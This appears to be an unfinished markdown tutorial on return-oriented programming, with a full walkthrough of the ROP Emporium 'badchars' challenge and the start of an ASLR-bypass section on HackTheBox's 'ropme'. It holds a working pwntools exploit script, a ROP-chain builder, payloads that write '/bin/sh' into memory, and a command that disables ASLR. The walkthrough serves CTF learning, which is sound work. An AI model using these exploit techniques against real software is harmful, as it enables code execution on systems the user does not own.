ROP B1n-3xp
- [x] Not Yet Completed#  Under Construction!!!! 

##### To Disable Address Space Layout Randomization

```bash
echo "0" >  /proc/sys/kernel/randomize_va_space
```
## Contents
- [Part1 : Basics of Writing a ROP chain](#part1--basics-of-writing-a-rop-chain)
	- [86x_32](#x86_32)
	- [86x_64](#x86_64)
- [Part2 : Dealing With Bad Chars](#part2--dealing-with-bad-chars)
- [Part3 : Bypassing ASLR to ROP & Leaking Libc Address in a 64bit Binary](#part3--bypassing-aslr-to-rop--leaking-libc-address-in-a-64bit-binary)

## Part1 : Basics of Writing a ROP chain

# **The Stack Difference Between 32 and 64 bit binary**

##  x86_32

```
+---------+------+------+------+------+------+------+
| syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
+---------+------+----------+---------+------+------+
|  %eax   | %ebx | %ecx | %edx | %esi | %edi | %ebp |
+---------+------+------+------+------+------+------+
```


*The way to exploit a 32bit binary is like reading a letter from a friend that's sent through post :
• First you will see a from address i.e the address from where the letter started it's journey (system_address)
• Second you will see a to address i.e the address to where the letter ends its journey (return address)
• Finally you will be able to see the contents of the letter i.e which is the context of the letter (arguments for the system_address)*

**Thus, the 32bit version payload would be…**

~~~
PAYLOAD = offset_padding + system_addr + "4_byte_junk" + print_flag
~~~


## x86_64
```
+---------+-------+-------+------+------+------+------+
| syscall |  arg0 |  arg1 | arg2 | arg3 | arg4 | arg5 |
+---------+-------+-------+------+------+------+------+
|   %rax  | %rdi  |  %rsi | %rdx | %r10 |  %r8 | %r9  |
+---------+-------+-------+------+------+------+------+
```



*The way to exploit a 64bit binary is like reading a letter which is empty on the outside:
• First ,you have to open the letter without damaging it to know what is inside (rop gadgets)
• Second, you will be able to see the contents of the letter i.e the context of the letter (arguments for the system_address)
• Finally after reading the letter you will be able to know who wrote the letter i.e the from address (system_address)*

**The 64bit version payload would be…**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PAYLOAD =  offset_padding + pop_rdi_gadget + print_flag + system_address
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


## **Writing in the Stack and executing  ROP (Return Oriented Programming) to pwn a binary**

◇ Find a place to write by checking for Writeable and Allocatable (WA) memory with enough space! 
~~~bash
readelf -S binary #[mem_address]
~~~
◇ Search for the appropriate mov gadget to inject the string into the stack by 
~~~bash
ropper --file binary --search "mov" #[mov_address]
~~~
◇ Search for the appropriate pop gadget to inject the string into the stack by 
~~~bash
ropper --file binary --search "pop" #[pop_address]
~~~

- ***Writing into the Stack in a 32bit binary***
	> For example if we are going to write the string “/bin/sh” into the stack. Given that we can only write 4 words at a time into the stack or else we may overwrite the other registers in the process.`
 
	- Writing “/bin” in the stack 
		- pop_address to clear the registers and then move to the mem_address and then write/overwrite it with “/bin” and then move back to EIP using mov_address , so that we can write the next part of string inside the memory
	~~~
	rop1 = pop_address + mem_address + “/bin” + mov_address
	~~~

	- Writing “//sh” or “/sh/x00”
		- pop_address to clear the registers and then move to the (mem_address+4)[The plus 4 is because the first 4 elements of the memory is already filled by rop1 ] and then write/overwrite it with “/sh” and then move back to EIP using mov_address , so that we can do a sys_call and call “/bin/sh”

	~~~
	rop2 = pop_address + (mem_address+4) + “/sh\x00” + mov_address
	~~~


- **Writing the Final Payload after writing “/bin/sh” into the stack**

~~~
PAYLOAD = offset_padding + rop1 + rop2 + system_address + *4_byte_junk* + mem_address
~~~
> We can also use print function and flag_name.txt as argument to cat the flag... rather than getting a shell. If a print function is given in the binary

- ***Writing into the Stack in a 64bit binary***

	> I didnt wanna take the same example here as “/bin/sh” because it takes only 8bytes so we can complete the rop in a single line given that in 64bit we can write 8 words at a time into the stack as a threshold so to make it more interesting , i am writing the string “/bin/cat *.txt” into the stack.`
 
	- Writing “/bin/cat” in the stack 
		- pop_address to clear the registers and then move to the mem_address and then write/overwrite it with “/bin/cat” and then move back to RIP using mov_address , so that we can write the next part of string inside the memory

	~~~
	rop1 = pop_address + mem_address + “/bin/cat” + mov_address
	~~~
	- Writing “ \*.txt” [Adding a space in the front as only “/bin/cat \*.txt” works and “/bin/cat \*.txt" doesnt]
		- pop_address to clear the registers and then move to the (mem_address+8)[The plus 8 is because the first 8 elements of the memory is already filled by rop1 ] and then write/overwrite it with “ \*.txt\x00\x00” and then move back to RIP using mov_address , so that we can do a sys_call and call “/bin/cat \*.txt”
	~~~
	rop2 = pop_address + (mem_address+8) + “ *.txt\x00\x00” + mov_address
	~~~

- Writing the Final Payload after writing “/bin/cat \*.txt” into the stack
`As it is a 64bit binary we need a pop_rdi gadget to pop RDI and create a fake stack to control the flow of execution, which can be selected from here `
~~~bash
ropper --file binary --search "pop rdi" #[pop_rdi]
~~~
~~~
PAYLOAD = offset_padding + rop1 + rop2 + pop_rdi + mem_address + sys_address
~~~


> But I am too lazy to make a ROP chain and then append it with the PAYLOAD.....,So i automated the process to create the ropchain,not the finest program,But it WORKS at 	somecases!!!, i am working on to find why the below program fails in some binary and works on other

~~~python
from pwn import * #[pip2 install pwntools] because, I personally feel python2 is great for pwning binary

def ropper(mem_addr,pop_addr,mov_addr,sys_addr,string,arch = 32):
# Functionable for both 32 and 64 bit
#IMPORTANT : CHOOSE THE correct address for the rop chain to work
# Format of pop_addr,mov_addr and sys_addr - only packed as 32bit
# Format of mem_addr - as int or hex_int
# Format of string - only str
# Format of Arch - only int
	i = 0
	rop = ""
	if arch == 64:
		s = [string[j:j+8] for j in range(0,len(string),8)]
		for a in s:
			if len(a) % 8 != 0:
				a += "\x00"*(8 - len(a))
			rop += pop_addr + p64(mem_addr+i) + a + mov_addr
			i += 8
	else:
		s = [string[j:j+4] for j in range(0,len(string),4)]
		for a in s:
			if len(a) % 4 != 0:
				a += "\x00"*(4 - len(a))
			rop += pop_addr + p32(mem_addr+i) + a + mov_addr
			i += 4
	return rop
~~~

## Part2 : Dealing With Bad Chars

### Dealing with Bad Characters while writing rop

> Bad Characters are a set of ascii that are unknown to binary , so it interprets the bad characters as someother character , which can break whole exploit.
- If our exploit goes wrong , eventhough when our way of exploiting the binary is right , we should debug the binary to check for bad characters.
- I guess an example would be a great idea to explain on how to deal with the badcharacters!
- I chose a challenge named “badchars(86x_32)” from Rop Emporium , https://ropemporium.com/challenge/badchars.html

**On Running the Binary , it says**

~~~
badchars by ROP Emporium
x86

badchars are: 'x', 'g', 'a', '.'
> 
~~~

- So , binary gave it's badchars... which just made my life easier,lets debug it to find some interesting functions inside the binary

~~~gdb
gef➤  info func
All defined functions:

Non-debugging symbols:
0x0804837c  _init 
0x080483b0  pwnme@plt $#%
0x080483c0  __libc_start_main@plt
0x080483d0  print_file@plt
0x080483e0  __gmon_start__@plt
0x080483f0  _start
0x08048430  _dl_relocate_static_pie
0x08048440  __x86.get_pc_thunk.bx
0x08048450  deregister_tm_clones
0x08048490  register_tm_clones
0x080484d0  __do_global_dtors_aux
0x08048500  frame_dummy
0x08048506  main $#%
0x0804852a  usefulFunction $#%
0x08048543  usefulGadgets $#%
0x08048560  __libc_csu_init
0x080485c0  __libc_csu_fini
0x080485c4  _fini
~~~
- I marked the interesting functions with *$#%* symbol
~~~gdb
gef➤  disas pwnme
Dump of assembler code for function pwnme@plt:
   0x080483b0 <+0>:     jmp    DWORD PTR ds:0x804a00c
   0x080483b6 <+6>:     push   0x0
   0x080483bb <+11>:    jmp    0x80483a0
End of assembler dump.
~~~
- There are no useful functions or instructions in pwnme() , it has a 2 jump function and it pushes 0x0 into the stack , which is totally normal
~~~gdb
gef➤  disas main
Dump of assembler code for function main:
   0x08048506 <+0>:     lea    ecx,[esp+0x4]
   0x0804850a <+4>:     and    esp,0xfffffff0
   0x0804850d <+7>:     push   DWORD PTR [ecx-0x4]
   0x08048510 <+10>:    push   ebp
   0x08048511 <+11>:    mov    ebp,esp
   0x08048513 <+13>:    push   ecx
   0x08048514 <+14>:    sub    esp,0x4
   0x08048517 <+17>:    call   0x80483b0 <pwnme@plt>
   0x0804851c <+22>:    mov    eax,0x0
   0x08048521 <+27>:    add    esp,0x4
   0x08048524 <+30>:    pop    ecx
   0x08048525 <+31>:    pop    ebp
   0x08048526 <+32>:    lea    esp,[ecx-0x4]
   0x08048529 <+35>:    ret    
End of assembler dump.
~~~
- I could safely say that , the main function is making a call to pwnme function, still i dont see something suspicious or useful
~~~gdb
gef➤  disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0804852a <+0>:     push   ebp
   0x0804852b <+1>:     mov    ebp,esp
   0x0804852d <+3>:     sub    esp,0x8
   0x08048530 <+6>:     sub    esp,0xc
   0x08048533 <+9>:     push   0x80485e0
   0x08048538 <+14>:    call   0x80483d0 <print_file@plt>
   0x0804853d <+19>:    add    esp,0x10
   0x08048540 <+22>:    nop
   0x08048541 <+23>:    leave  
   0x08048542 <+24>:    ret    
End of assembler dump.
~~~
- Ah!.We get to see a print_file() which can read a file which is given as it's argument, hence `prt_add = 0x80483d0`
- The only file we want to read is flag.txt ,aah! ,going back to the badchars ['a','g','x','.'] ,we can understand only the words ['f','l',t] can be used....., you may think , we can use the string as /bin/sh to get a shell and also it has no badchars , but , we dont have a system() or execve() [I am not talking about the address we get from `p system` in GDB , its a temporary address that is created in runtime,so it respectively changes from OS to OS we are using and it also changes if ASLR is enabled which may or may not cause errors, in simple words it's a loose end]
~~~gdb
gef➤  disas usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x08048543 <+0>:     add    BYTE PTR [ebp+0x0],bl
   0x08048546 <+3>:     ret    
   0x08048547 <+4>:     xor    BYTE PTR [ebp+0x0],bl
   0x0804854a <+7>:     ret    
   0x0804854b <+8>:     sub    BYTE PTR [ebp+0x0],bl
   0x0804854e <+11>:    ret    
   0x0804854f <+12>:    mov    DWORD PTR [edi],esi
   0x08048551 <+14>:    ret    
   0x08048552 <+15>:    xchg   ax,ax
   0x08048554 <+17>:    xchg   ax,ax
   0x08048556 <+19>:    xchg   ax,ax
   0x08048558 <+21>:    xchg   ax,ax
   0x0804855a <+23>:    xchg   ax,ax
   0x0804855c <+25>:    xchg   ax,ax
   0x0804855e <+27>:    xchg   ax,ax
End of assembler dump.
~~~
- We are given 3 gadgets to make our ropchain [add,xor and sub] , we are going to use only 1 gadget.

# *Devising a Solution*
1. Finding the offset of the binary to trigger a buffer overflow.
	~~~gdb
	gef➤  pattern create 50
	[+] Generating a pattern of 50 bytes
	aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
	~~~
	- Sadly we have too many "a" and "f" , which are the badchars , so we can't check the offset correctly.
	- Time to make our own payload , i use msf to create a payload without bad characters.
	~~~bash
	msf-pattern_create -l 50 -s ABC,123,DEF
	A1DA1EA1FA2DA2EA2FA3DA3EA3FB1DB1EB1FB2DB2EB2FB3DB3
	~~~
	- On giving the input , we successfully overwrite EIP and cause a segfault.
	~~~gdb
	[#0] Id 1, Name: "1", stopped 0x44334246 in ?? (), reason: SIGSEGV
	~~~
	- We have finalized that the offset is **44** after checking EIP address with msf
	~~~bash
	msf-pattern_offset -l 50 -s ABC,123,DEF -q 0x44334246
	[*] Exact match at offset 44
	~~~
2. Next , We have to find a address to write our string , but the string should not contain any bad characters , so we should use 1 of the gadget operation to encode the string and then write it into the stack and then decode it using the gadget to get the original string.
	- ###### Finding a Writable Memory
		~~~bash
		readelf -S <binary_name> | grep "WA" # WA - Writable and Allocatable
  		[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
	  	[19] .init_array       INIT_ARRAY      08049efc 000efc 000004 04  WA  0   0  4
	  	[20] .fini_array       FINI_ARRAY      08049f00 000f00 000004 04  WA  0   0  4
  		[21] .dynamic          DYNAMIC         08049f04 000f04 0000f8 08  WA  6   0  4
  		[22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
		[23] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4
  		[24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
  		[25] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
		~~~
		- .data and .bss looks fine to write the memory as these to have enough size to write and i am rejecting others because it may have filled with libc address , which we doesnt want to touch.
		- I will write my string in .data , hence `mem_add = 0x0804a018`
	- ###### Selecting a Gadget operation and performing it on 
		- I chose XOR gadget , so I must encode the string in xor , but with what???? , hence `xor_add = p32(0x08048547)`
		~~~gdb
		0x08048547 <+4>:     xor    BYTE PTR [ebp+0x0],bl
		~~~
		- As the XOR instruction says , the XOR is done bitwise between , **ebp** and **bl** , So we need a gadget that contains **pop ebp** and we have to know what is the value of **bl**, but i got some random value when i checked the value **bl** ,i will use the classic pattern `['A'\*44 + 'junk']` to check the value of **bl**
		~~~gdb
		gef➤  p $bl
		$4 = 0x41
		~~~
		- We got the the **bl** value as 0x41 , which is "A" in ASCII , so the some byte in the first 44 bytes of "A" controls the **bl** , we dont wanna spend time in finding which specific byte controls **bl** and i think it's unnecessary at this case
		- XORing `flag.txt` with `0x41` using pycryptodome
		~~~python
		from Crypto.Util.strxor_c import strxor
		e = strxor_c(b"flag.txt",0x41) # '- &o595
		print(e)
		~~~
	- ###### Writing the encoded string inside memory [.data]
		- First We need a pop address to empty the registers so that we can fillup out data inside it and control it to do what we want to do 
			- ROPPER will help us to find the ROP gadgets without any bad character with the flag `-b`
			~~~bash
			ropper --file 1 -b 7867612e --search "pop"
			[INFO] Load gadgets from cache
			[LOAD] loading... 100%
			[LOAD] filtering badbytes... 100%
			[LOAD] removing double gadgets... 100%
			[INFO] Searching for gadgets: pop
			[INFO] File: 1
			0x08048525: pop ebp; lea esp, dword ptr [ecx - 4]; ret; 
			0x080485bb: pop ebp; ret; 
			0x080485b8: pop ebx; pop esi; pop edi; pop ebp; ret; 
			0x0804839d: pop ebx; ret; 
			0x08048524: pop ecx; pop ebp; lea esp, dword ptr [ecx - 4]; ret; 
			0x080485ba: pop edi; pop ebp; ret; 
			0x080485b9: pop esi; pop edi; pop ebp; ret; $#%
			0x08048527: popal; cld; ret; 
			~~~
			- I marked the gadget that is useful as *$#%* , i selected that specific gadget because registers like **ESI** and **EDI** are best to write and here the only gadget that starts with **pop esi; pop edi;** is `0x080485b9`, still we have **pop ebp** at the end , which is a problem as it is excess space to write , so we will be filling it with junk!
		- Second , we need a mov address to move the string into a specific memory [.data].
			- With the help of ropper i am searching for `mov dword` as we are injecting data as a 4byte string not as a single character.
			~~~bash
			ropper --file 1 -b 7867612e --search "mov dword"
			[INFO] Load gadgets from cache
			[LOAD] loading... 100%
			[LOAD] filtering badbytes... 100%
			[LOAD] removing double gadgets... 100%
			[INFO] Searching for gadgets: mov dword
			[INFO] File: 1
			0x0804854f: mov dword ptr [edi], esi; ret; 
			~~~
			- That was fast and it matches the pop address registers perfectly,hence `mov_add = p32(0x0804854f)`
		- Constructing a Payload to write the memory into the stack with the gathered information
			- As we can see the mov address instruction says that the string is moved from **ESI** to **EDI** , so **ESI** is the place where we keep the encoded string.
		```python
		from pwn import *
		from Crypto.Util.strxor import strxor_c

		mem_add = 0x0804a018            #.data
		e = strxor_c(b"flag.txt",0x41)  #bl = 0x41
		xor_add = p32(0x08048547)       #xor  BYTE PTR [ebp+0x0],bl
		pop_add = p32(0x080485b9)      #pop esi; pop edi; pop ebp; ret;
		mov_add = p32(0x0804854f) 		#mov dword ptr [edi], esi; ret; 
		
		payload = 'A'*44 # offset
		
		# Sending the first 4bytes of encoded string
		payload += pop_add # Clearing the registers to create a fake stack
		payload += e[:4] #Sending the encoded bytes as this is stored as ESI as per mov gadget instruction and also it's a 32 bit binary so , only 4 bytes can be written at a time , 1st Instruction is done i.e [pop esi;]
		payload += p32(mem_add) # 2nd Instruction is done i.e [pop edi;]
		payload += "AAAA" # 3rd Instruction is done i.e [pop ebp; ret], as i dont want mov_add to be in EBP as i have no use if i filled EPB with mov gadget address , it doesnt execute anything, so i am filling it with junk!
		payload += mov_add 
		
		# Sending the next 4bytes of encoded string
		payload += pop_add
		payload += e[4:] #1st Instruction is done i.e [pop esi;]
		payload += p32(mem_add+4) #The plus 4 is because we have already written the first 4 bytes into .data , 2nd Instruction is done i.e [pop edi;]
		payload += "AAAA" #3rd Instruction is done i.e [pop ebp; ret]
		payload += mov_add
		```
		- Using the payload in GDB and checking if we have written our encode string in .data address
		~~~bash
		gef➤  x/s 0x0804a018
		0x804a018:      "'- &o595"
		~~~
		- Yahhhhh! , We have successfully written out our encoded string inside .data memory
	
	- ###### Decoding the encoded string inside memory [.data]
		- Decoding the string is kinda tedious , as we have to do it bitwise for every single char in the string in .data , but why fear when python is here!
		- Now we need a pop gadget to write into **EBP** , but why **EBP** ??? because the XOR gadget we chose `BYTE PTR [ebp+0x0],bl` does XOR between value in **EBP** and **bl** ,we know that the value of **bl = 0x41** , so now we have 2 choices.
			1. We either use old pop gadget as it contains **ebp** as it's last instruction before ret `pop esi; pop edi; pop ebp; ret;` by filling junk inside **ESI** and **EDI** and then filling **EBP** with the memory address for every byte to XOR it
			2. Or , We can find another pop gadget using ropper and use it to write into the binary 
			~~~bash
			ropper --file 1 -b 7867612e --search "pop ebp"
			[INFO] Load gadgets from cache
			[LOAD] loading... 100%
			[LOAD] filtering badbytes... 100%
			[LOAD] removing double gadgets... 100%
			[INFO] Searching for gadgets: pop ebp
			[INFO] File: 1
			0x08048525: pop ebp; lea esp, dword ptr [ecx - 4]; ret; 
			0x080485bb: pop ebp; ret; 
			~~~
			The last gadget `0x080485bb: pop ebp; ret;` is perfect , we can use this pop address also to write into **EBP**
		- But i am going with the 1st choice , as i dont want to make the solution complex by introducing a new pop gadget
		~~~python
		mem_add = 0x0804a018            #.data
		e = strxor_c(b"flag.txt",0x41)  #bl = 0x41
		xor_add = p32(0x08048547)       #xor  BYTE PTR [ebp+0x0],bl
		pop_add = p32(0x080485b9)       #pop esi; pop edi; pop ebp; ret;
		mov_add = p32(0x0804854f) 	#mov dword ptr [edi], esi; ret; 
		prt_add = p32(0x80483d0)
		payload = 'A'*44 # offset
		payload += pop_add + e[:4] + p32(mem_add) + "AAAA" + mov_add 
		payload += pop_add + e[4:] + p32(mem_add+4) + "AAAA" + mov_add 
		
		# PAYLOAD for XORing the string starts from here
		payload += pop_add  		# Clearing the Stack
		payload += "AAAA" 		# Filling ESI with junk as it is not useful in this case
		payload += "AAAA" 		# Filling EDI with junk as it is not useful in this case
		payload += p32(mem_add)		# Filling EBP with memory address so that the XORing operation takes place between 0x41 (bl) and first character inside .data, we have increase the memory address by one until all of the string is xored , in this case the length of string is 8 , so we have to 7 more times to change all the bytes of the string inside .data
		payload += xor_add 		#XOR Operation takes place in .data
		
		print(payload)
		~~~
		- Let us check if the first byte of .data is decoded using the payload we generated and by debugging it in GDB
		~~~
		gef➤  x/s 0x0804a018
		0x804a018:      "f- &o595"
		~~~
		- Hurray!, We have got the first bytes as **f** after XORing!, Now we can automate the process of xoring using
		```python
		from pwn import *
		from Crypto.Util.strxor import strxor_c
		mem_add = 0x0804a018            #.data
		e = strxor_c(b"flag.txt",0x41)  #bl = 0x41
		xor_add = p32(0x08048547)       #xor  BYTE PTR [ebp+0x0],bl
		pop_add = p32(0x080485b9)       #pop esi; pop edi; pop ebp; ret;
		mov_add = p32(0x0804854f) 	#mov dword ptr [edi], esi; ret; 
		prt_add = p32(0x80483d0)
		payload = 'A'*44 # offset
		payload += pop_add + e[:4] + p32(mem_add) + "AAAA" + mov_add 
		payload += pop_add + e[4:] + p32(mem_add+4) + "AAAA" + mov_add
		for i in range(len(e)):
			payload += pop_add + "AAAA" + "AAAA" + p32(mem_add+i) + xor_add
		```
		- Now we should have decoded all the strings as **flag.txt** , we are good to write the final payload to call the **print_file()** function and give memory address as an argument so that we can open **flag.txt**
	- ###### Final Payload
		- The desired function we have to call to read the flag.txt is print_file() function
		~~~python
		....SNIPPED.....
		prt_add = 0x80483d0
		payload += prt_add # Calling print_file()
		payload += "AAAA"  # Adding Junk because when a function is called , first 4 bytes after calling function fills into EBP and then it fill the argument(s)
		payload += p32(mem_add) # Giving the memory address as an argument to opent the flag.txt
		....SNIPPED.....
		~~~
		- So the Final Payload after adding some pwntools magic looks something like this
		~~~python
		from pwn import *
		from Crypto.Util.strxor import strxor_c

		elf = ELF("binary_name")
		r = elf.process()
		r.recvuntil("> ")

		mem_add = 0x0804a018            #.data
		e = strxor_c(b"flag.txt",0x41)  #bl = 0x41
		xor_add = p32(0x08048547)       #xor  BYTE PTR [ebp+0x0],bl
		pop_add = p32(0x080485b9)       #pop esi; pop edi; pop ebp; ret;
		mov_add = p32(0x0804854f) 	#mov dword ptr [edi], esi; ret; 
		prt_add = p32(0x80483d0)	#0x80483d0 <print_file@plt>

		payload = 'A'*44 # offset

		payload += pop_add + e[:4] + p32(mem_add) + "AAAA" + mov_add 
		payload += pop_add + e[4:] + p32(mem_add+4) + "AAAA" + mov_add

		for i in range(len(e)):
			payload += pop_add + "AAAA" + "AAAA" + p32(mem_add+i) + xor_add
			
		payload += prt_add + "AAAA" + p32(mem_add)
		
		r.sendline(payload)
		r.interactive()
		~~~

## Part3 : Bypassing ASLR to ROP & Leaking Libc Address in a 64bit Binary

### Bypassing ASLR to ROP

- ASLR - Address Space Layout Randomisation ,Its a memory protection process where the entire memory address are randomised by changing the base address every-time the binary executes.
- If the binary we intend to exploit a binary in the local server , we can easily disable ASLR and exploit the binary. But the problem rises when the binary is running on a remote server where the ASLR is enable and cant be disabled remotely.
- This is demonstrated by exploiting ropme from HackTheBox(Retired Pwn Challenge) and with ASLR Enabled in my Desktop

**On Running the binary**

```
ROP me outside, how 'about dah?
```

**Checking the executable using Checksec**

```
Arch:     amd64-64-little #x64bit Little Endian
RELRO:    Partial RELRO 
Stack:    No canary found
NX:       NX enabled #We cant use a shellcode to pop a shell by executing directly in the stack
PIE:      No PIE (0x400000)
```

- So the binary just expects a input from us and its a x64 bit binary , pretty straight forward. Let us find out if there is some hidden function inside the binary

```gdb
gef➤  info func
All defined functions:

Non-debugging symbols:
0x00000000004004b0  _init
0x00000000004004e0  puts@plt
0x00000000004004f0  __libc_start_main@plt
0x0000000000400500  fgets@plt
0x0000000000400510  fflush@plt
0x0000000000400520  __gmon_start__@plt
0x0000000000400530  _start
0x0000000000400560  deregister_tm_clones
0x00000000004005a0  register_tm_clones
0x00000000004005e0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400626  main
0x0000000000400670  __libc_csu_init
0x00000000004006e0  __libc_csu_fini
0x00000000004006e4  _fini
```

- Nothing looks suspicious nor interesting , we shall see what’s inside the main function.

```gdb
gef➤  
Dump of assembler code for function main:
   0x0000000000400626 <+0>:     push   rbp
   0x0000000000400627 <+1>:     mov    rbp,rsp
   0x000000000040062a <+4>:     sub    rsp,0x50
   0x000000000040062e <+8>:     mov    DWORD PTR [rbp-0x44],edi
   0x0000000000400631 <+11>:    mov    QWORD PTR [rbp-0x50],rsi
   0x0000000000400635 <+15>:    mov    edi,0x4006f8
   0x000000000040063a <+20>:    call   0x4004e0 <puts@plt>
   0x000000000040063f <+25>:    mov    rax,QWORD PTR [rip+0x200a0a]        # 0x601050 <stdout@@GLIBC_2.2.5>
   0x0000000000400646 <+32>:    mov    rdi,rax
   0x0000000000400649 <+35>:    call   0x400510 <fflush@plt>
   0x000000000040064e <+40>:    mov    rdx,QWORD PTR [rip+0x200a0b]        # 0x601060 <stdin@@GLIBC_2.2.5>
   0x0000000000400655 <+47>:    lea    rax,[rbp-0x40]
   0x0000000000400659 <+51>:    mov    esi,0x1f4
   0x000000000040065e <+56>:    mov    rdi,rax
   0x0000000000400661 <+59>:    call   0x400500 <fgets@plt>
   0x0000000000400666 <+64>:    mov    eax,0x0
   0x000000000040066b <+69>:    leave  
   0x000000000040066c <+70>:    ret    
End of assembler dump.
```

- The fgets call in the main function creates the buffer overflow vulnerability and the puts address can be used the put the address of desired function addresses we need.

# *Devising a Solution*

1. Finding the offset of the binary , in this case you wont be able to overwrite the RIP (x64bit Instruction Pointer) right away as this is a 64bit binary not a 32bit binary, Here you can overwrite both RBP(x64bit Base Pointer) and RSP(x64bit Stack Pointer)

```gdb
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
gef➤  r
Starting program: /root/Desktop/ropme 
ROP me outside, how 'about dah?
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
0x000000000040066c in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x0000000000602779  →  0x0000000000000000
$rdx   : 0x0               
$rsp   : 0x00007fffffffdec8  →  "jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa[...]"
$rbp   : 0x6161616161616169 ("iaaaaaaa"?)
$rsi   : 0x0000000000602779  →  0x0000000000000000
$rdi   : 0x00007ffff7fad680  →  0x0000000000000000
$rip   : 0x000000000040066c  →  <main+70> ret 
$r8    : 0x00007fffffffde80  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$r9    : 0x6161616161616176 ("vaaaaaaa"?)
$r10   : 0x6161616161616177 ("waaaaaaa"?)
$r11   : 0x6161616161616178 ("xaaaaaaa"?)
$r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
....SNIPPED....
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ropme", stopped 0x40066c in main (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40066c → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa #RSP
[+] Searching 'jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa'
[+] Found at offset 72 (big-endian search) 
gef➤  pattern offset 0x6161616161616169 #RBP
[+] Searching '0x6161616161616169'
[+] Found at offset 64 (little-endian search) likely
[+] Found at offset 57 (big-endian search)
```

- As we can see that the RIP is not overwritten , we have found the RSP offset by just copy pasting the value of RSP and finding the offset , we can also find RSP indirectly by finding the RBP offset and then adding 8 to it to find the RSP, `RSP STACK = 8 + RBP STACK`

2. Using ROP and controlling RIP

- The offset is 72. Now our goal is to get a control on RIP.
    
- The Usage of ROP is essential in to get a control over RIP because , we are just going to return to RIP from RSP and that’s where the Return Oriented Programming Comes in.
    
    - Using Ropper to find the return address
    
    ```bash
    root@kali:~/Desktop# ropper --file ropme --search ret
    [INFO] Load gadgets from cache
    [LOAD] loading... 100%
    [LOAD] removing double gadgets... 100%
    [INFO] Searching for gadgets: ret
    
    [INFO] File: ropme
    0x000000000040064a: ret 0xfffe; 
    0x00000000004004c9: ret;
    ```
    - The last address looks fine as it just has return without any parameter.
- Now using creating a payload to control RIP
    

```python
from pwn import *
context.arch = 'amd64' #pwntools configuration for set the architecture
ret_add = p64(0x00000000004004c9)
payload = [
    "A"*72, # offset 
    ret_add, # Address to return to RIP from RSP
    p64(0xcafebabe) # A fake RIP address to cause a SEGFAULT and to check if we can successfully control the RIP.
]
open("payload",'wb').write("".join(payload))
```

- Running the binary with the payload
```gef
gef➤ r < payload
Starting program: /root/Desktop/ropme < payload 
ROP me outside, how 'about dah?
Program received signal SIGSEGV, Segmentation fault. 0x00000000cafebabe in ?? () \[ Legend: Modified register | Code | Heap | Stack | String \] ───────────────────────────────────────────────────────────────── registers────
$rax : 0x0
$rbx : 0x0
$rcx : 0xfbad20a8
$rdx : 0x0
$rsp : 0x00007fffffffded8 → 0x0000000100000000
$rbp : 0x4141414141414141 (“AAAAAAAA”?)
$rsi : 0x00000000006026b0 → “AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\[…\]”
$rdi : 0x00007ffff7fad680 → 0x0000000000000000 
$rip : 0xcafebabe
$r8 : 0x00007fffffffde80 → “AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\[…\]”
$r9 : 0x4141414141414141 (“AAAAAAAA”?)
$r10 : 0x4141414141414141 (“AAAAAAAA”?)
$r11 : 0x246
$r12 : 0x0000000000400530 → &lt;_start+0&gt; xor ebp, ebp
$r13 : 0x0
$r14 : 0x0
$r15 : 0x0
…SNIPPED… 
[#0] Id 1, Name: “ropme”, stopped 0xcafebabe in ?? (), reason: SIGSEGV
```    
- We have successfully overwritten RIP , Now we can move to the next section where we can find the base address and libc address of system and “/bin/sh” to trigger a shell with ASLR enabled
    

3. Leaking the Libc Address and finding the Base Address

- Using Put Address from Global Offset Table(GOT) to print the desired function to find the base address. This can be done in 2 ways - Using `POP RDI` and With ROP function from pwntools
    - Manual Method
        
        - Find the `POP RDI; ret` address
        
        ```gdb
        0x00000000004006d3: pop rdi; ret; 
        ```
        - GOT address in a binary - We print it’s address and compare it with the local process of the binary to get the base address, It’s a crucial part in bypassing ASLR
        - PUT Function address in the binary - This is essentials because , we are going to use this to put a desired function’s address as output
~~~python
        from pwn import *
        elf = ELF("./ropme",checksec = False)
		r = elf.process()
